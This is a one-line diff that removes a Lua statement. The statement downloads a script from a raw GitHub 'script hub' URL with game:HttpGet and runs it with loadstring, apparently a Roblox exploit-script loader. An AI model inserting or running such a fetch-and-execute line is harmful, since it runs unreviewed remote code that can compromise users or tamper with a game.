@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ilayaktas9-art/ilay-s-script/main/script.hub?v="..math.random()))()
